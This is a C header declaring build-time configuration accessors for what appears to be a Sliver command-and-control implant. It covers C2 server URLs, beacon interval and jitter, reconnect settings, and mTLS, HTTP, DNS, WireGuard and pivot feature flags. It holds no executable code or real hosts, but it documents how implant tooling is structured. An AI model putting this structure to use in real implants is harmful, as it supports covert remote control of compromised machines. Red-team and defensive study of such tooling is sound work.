/* sliver/config.h - build-time configuration accessors.
 *
 * The generated header (implant_build_config.h) and translation unit
 * (implant_secrets.c) are produced by cmake/SliverConfigGen.cmake from the
 * server-supplied config.json. Only this module includes the generated header;
 * everything else goes through the accessors below.
 */
#ifndef SLIVER_CONFIG_H
#define SLIVER_CONFIG_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/* --- generated symbols (defined in implant_secrets.c) ------------------- */
extern const char *const sliver_c2_urls[];
extern const size_t sliver_c2_url_count;
extern const char *const sliver_implant_name;
extern const char *const sliver_build_id_string;

/* --- accessors --------------------------------------------------------- */
const char *sliver_config_name(void);
const char *sliver_config_build_id(void);
size_t sliver_config_c2_count(void);
const char *sliver_config_c2_url(size_t index);
char sliver_config_strategy(void);
long long sliver_config_reconnect_interval_ns(void);
long long sliver_config_beacon_interval_ns(void);
long long sliver_config_beacon_jitter_ns(void);
int sliver_config_max_connection_errors(void);

int sliver_config_feature_mtls(void);
int sliver_config_feature_http(void);
int sliver_config_feature_dns(void);
int sliver_config_feature_wg(void);
int sliver_config_feature_pivot(void);

/* Returns 0 when the injected configuration is self-consistent, -1 otherwise
 * and writes a human readable reason into err (if err != NULL). */
int sliver_config_self_check(char *err, size_t err_len);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_CONFIG_H */
